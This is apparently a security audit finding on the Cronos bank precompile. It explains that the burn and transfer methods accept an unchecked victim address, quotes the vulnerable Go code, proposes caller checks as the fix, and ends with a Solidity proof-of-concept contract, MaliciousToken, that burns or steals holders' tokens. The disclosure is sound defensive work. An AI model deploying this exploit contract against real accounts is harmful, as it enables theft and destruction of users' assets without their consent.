### Title
Bank Precompile `burn` and `transfer` Allow Any Smart Contract to Drain Arbitrary Accounts of Its Own Denom Tokens — (`File: x/cronos/keeper/precompiles/bank.go`)

### Summary
The `BankContract` precompile exposes `burn(address, uint256)` and `transfer(address, address, uint256)` methods that accept an arbitrary victim address as a caller-supplied argument. The denom operated on is derived from `contract.Caller()` (the calling contract's address), but there is no check that the calling contract is authorized to act on behalf of the victim address. Any smart contract can therefore burn or transfer `evm/<itsOwnAddress>` tokens from any account that holds them, without the holder's consent.

### Finding Description

In `BankContract.Run()`, the `burn` and `transfer` cases share a critical missing guard:

**`burn` path (lines 113–156):**
```go
recipient := args[0].(common.Address)   // victim — caller-supplied, unchecked
amount    := args[1].(*big.Int)
addr      := sdk.AccAddress(recipient.Bytes())
denom     := EVMDenom(contract.Caller()) // evm/<callerContract>
// ...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
```

**`transfer` path (lines 167–200):**
```go
sender    := args[0].(common.Address)   // from — caller-supplied, unchecked
recipient := args[1].(common.Address)
from      := sdk.AccAddress(sender.Bytes())
denom     := EVMDenom(contract.Caller())
// ...
bc.bankKeeper.SendCoins(ctx, from, to, ...)
```

In both cases the denom is `evm/<contract.Caller()>`, so the calling contract can only affect its own denom. However, the address to burn *from* or transfer *from* is a free argument — there is no assertion that `contract.Caller() == recipient` (burn) or `contract.Caller() == sender` (transfer). The only guard present is `checkBlockedAddr`, which only rejects Cosmos module accounts. [1](#0-0) [2](#0-1) [3](#0-2) 

The interface exposed to Solidity callers is:

```solidity
function burn(address, uint256) external payable returns (bool);
function transfer(address, address, uint256) external payable returns (bool);
``` [4](#0-3) 

### Impact Explanation

**Critical — Unauthorized burn and transfer of `evm/<denom>` assets from arbitrary accounts.**

1. Attacker deploys `MaliciousToken` at address `0xM`, creating denom `evm/0xM`.
2. Users acquire `evm/0xM` tokens through normal DeFi interaction (liquidity provision, staking rewards, etc.).
3. Attacker calls `bank.burn(victimAddress, victimBalance)` from `MaliciousToken` → all of victim's `evm/0xM` native-side tokens are destroyed with no consent.
4. Alternatively, attacker calls `bank.transfer(victimAddress, attackerAddress, victimBalance)` → victim's tokens are silently transferred to the attacker.

This satisfies the Critical impact criterion: *unauthorized burn/transfer of precompile-controlled assets*.

### Likelihood Explanation

Any smart contract deployed on Cronos that is registered as a token contract (or simply calls the bank precompile at `0x0000000000000000000000000000000000000064`) can exploit this. No special privilege, leaked key, or governance action is required. The attacker only needs users to hold the `evm/<attackerContract>` denom, which is a normal outcome of any DeFi protocol built on top of the bank precompile pattern. [5](#0-4) 

### Recommendation

For `burn`: assert that the address being burned from is the calling contract itself, or that the calling contract has been explicitly authorized by the holder:

```go
// Enforce: caller can only burn from itself, or require explicit approval
if recipient != contract.Caller() {
    return nil, errors.New("burn: caller is not the token holder")
}
```

For `transfer`: assert that the `sender` argument equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("transfer: caller is not the sender")
}
```

Alternatively, implement an allowance/approval mechanism analogous to ERC-20 `approve`/`transferFrom` at the native bank precompile level.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function burn(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract MaliciousToken {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: users acquire evm/<address(this)> tokens through normal interaction
    // Step 2: attacker calls drainVictim to steal or destroy victim's holdings

    function burnVictim(address victim, uint256 amount) external {
        // Burns evm/<address(this)> tokens from victim without their consent
        bank.burn(victim, amount);
    }

    function stealFromVictim(address victim, address attacker, uint256 amount) external {
        // Transfers evm/<address(this)> tokens from victim to attacker
        bank.transfer(victim, attacker, amount);
    }
}
```

`contract.Caller()` inside the precompile will be `address(MaliciousToken)`, so `denom = evm/<MaliciousToken>`. The victim's balance of that denom is burned or transferred with no authorization check. [6](#0-5)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L32-33)
```go
	bankContractAddress     = common.BytesToAddress([]byte{100})
	bankGasRequiredByMethod = map[[4]byte]uint64{}
```

**File:** x/cronos/keeper/precompiles/bank.go (L103-156)
```go
func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L174-193)
```go
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
```

**File:** x/cronos/events/bindings/src/Bank.sol (L1-9)
```text
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address,uint256) external payable returns (bool);
    function balanceOf(address,address) external view returns (uint256);
    function burn(address,uint256) external payable returns (bool);
    function transfer(address,address,uint256) external payable returns (bool);
}
```
